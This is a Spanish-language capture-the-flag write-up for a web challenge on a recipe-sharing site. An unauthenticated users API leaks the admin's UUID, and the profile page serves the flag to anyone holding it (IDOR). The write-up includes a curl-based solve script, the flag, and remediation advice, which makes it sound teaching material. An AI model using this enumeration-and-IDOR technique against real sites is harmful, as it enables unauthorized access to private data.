# Write-up — Mise en Place

| | |
|---|---|
| **CTF** | FluidAttacks CTF 2026 |
| **Categoría** | web |
| **Dificultad** | Easy |
| **Puntos** | 100 |
| **Flag** | `flag{7ed72ab3dcd7d18a}` |
| **Vulnerabilidad** | IDOR / Broken Access Control + exposición de datos en API |

---

## 1. Enunciado

> A new recipe-sharing platform launched for the Latin American cooking crowd:
> profiles, recipes, the usual. Word is **the admin's profile has something the
> rest of us don't.**

Instancia: `https://cefe906e882e9e1f.chal.ctf.ae` — plataforma de recetas en
Flask (`Server: gunicorn`).

La pista es directa: el perfil del administrador contiene algo que los demás no.
Hay que llegar a él.

---

## 2. Reconocimiento

La portada (`GET /`) lista tarjetas de perfiles. Extrayendo los `href` del HTML
aparecen las rutas relevantes:

```
/api/recipes
/api/users
/profile/152d255b-8d34-48d9-bb70-07d5fa2f69f7
/profile/23846f90-d61d-451f-8a65-b250d671630f
/profile/48e91eb0-9f3e-4db9-9926-ba8ea0bae89c
/profile/5f978fa5-23c9-4b5f-aad4-b9db89980fa7
/profile/c5cf549d-8167-46ca-be45-6cb2d6f936f7
/profile/fa9bf693-5a7e-4ff0-adc3-fa6cece6f42c
/register
```

Los perfiles se direccionan por **UUID** (`/profile/<uuid>`). La UI enlaza a 6
perfiles. Como los UUID no son adivinables por fuerza bruta, el camino no es
enumerar IDs sino **encontrar el UUID del admin en otra parte**.

---

## 3. La fuga: `/api/users`

La API expone el listado completo de usuarios, sin autenticación y sin filtrar por
rol:

```http
GET /api/users
```
```json
{
  "pagination": {"page":1,"pages":1,"per_page":10,"total":7},
  "users": [
    {"display_name":"Chef Admin","role":"admin","username":"chef_admin",
     "uuid":"d6daebbc-392f-49d7-984e-98fc94f08793","joined":"2025-11-01"},
    {"display_name":"Maria Gonzalez","role":"member", ...},
    ... 5 members más ...
  ]
}
```

Hay **7** usuarios, pero la portada solo mostraba **6**. El séptimo es
`chef_admin` con `role: admin` y UUID `d6daebbc-392f-49d7-984e-98fc94f08793` —
que **no está enlazado en ninguna parte de la UI**.

---

## 4. Explotación (IDOR)

El endpoint `/profile/<uuid>` no aplica ningún control de acceso: sirve cualquier
perfil a quien conozca el UUID. Con el UUID del admin filtrado por `/api/users`:

```http
GET /profile/d6daebbc-392f-49d7-984e-98fc94f08793
```

El HTML del perfil del admin incluye una tarjeta que los perfiles de members no
tienen:

```html
<span class="flag-label">System Flag</span>
<code class="flag-value">flag{7ed72ab3dcd7d18a}</code>
```

### Script de solución (`solve.sh`)

```bash
#!/usr/bin/env bash
B="https://cefe906e882e9e1f.chal.ctf.ae"
ADMIN=$(curl -s "$B/api/users" | python3 -c \
  'import sys,json;print([u["uuid"] for u in json.load(sys.stdin)["users"] if u["role"]=="admin"][0])')
curl -s "$B/profile/$ADMIN" | grep -oiE 'flag\{[^}]*\}'
```

---

## 5. Flag

```
flag{7ed72ab3dcd7d18a}
```

---

## 6. Causa raíz y remediación

**Causa raíz:** dos capas fallan a la vez.

1. **Exposición excesiva de datos** — `/api/users` devuelve a todos los usuarios,
   incluyendo cuentas administrativas y su identificador interno, a cualquier
   visitante anónimo. El UUID debía tratarse como dato sensible (es la "llave" del
   perfil), pero se publica libremente.
2. **Broken Access Control (IDOR)** — `/profile/<uuid>` no verifica quién pide el
   recurso ni si el contenido es privado. El "System Flag" es información
   restringida servida sin autorización.

**Cómo se arregla:**

- **Autorizar por recurso, no por oscuridad.** El hecho de que un UUID no esté
  enlazado no lo protege; hay que comprobar en el servidor que el solicitante puede
  ver ese perfil (y nunca exponer contenido admin en una vista pública).
- **Minimizar la respuesta de la API.** `/api/users` no debería listar cuentas
  admin ni devolver campos internos a usuarios anónimos; aplicar filtrado por rol y
  proyección de campos (DTOs).
- **Separar datos públicos de privados** en el modelo del perfil: el "System Flag"
  no debe formar parte del render del perfil bajo ninguna circunstancia de acceso
  público.

**Lección de CTF:** "el admin tiene algo que los demás no" + perfiles con UUID =
buscar dónde se filtra el identificador del admin (API de listado, sitemap,
respuestas JSON) y luego pedir su recurso directamente. La UI que "esconde" un
enlace nunca es un control de acceso.
